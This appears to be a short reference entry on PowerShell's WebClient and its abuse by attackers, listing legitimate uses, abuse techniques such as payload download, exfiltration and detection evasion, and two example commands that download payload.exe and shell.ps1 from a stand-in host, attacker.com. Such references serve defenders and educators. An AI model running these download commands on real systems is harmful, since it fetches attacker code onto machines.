# PowerShell WebClient
## What is it?
*PowerShell provides built-in web client capabilities that allow scripts to download and upload files over HTTP/HTTPS.*

## Legitimate Use
- *Automating file downloads from trusted internal servers.*
- *Retrieving updates, configurations, or scripts in enterprise environments.*
- *Managing remote systems using PowerShell scripting.*

## How to abuse it
- *Downloading malicious payloads directly from an attackerâ€™s web server.*
- *Exfiltrating sensitive data using HTTP POST requests.*
- *Evading detection by leveraging encrypted HTTPS traffic.*

## Example Attacks
```
$client = New-Object System.Net.WebClient; $client.DownloadFile("http://attacker.com/payload.exe", "C:\Users\Public\payload.exe")

Invoke-WebRequest -Uri "http://attacker.com/shell.ps1" -OutFile "C:\Windows\Temp\shell.ps1"
```
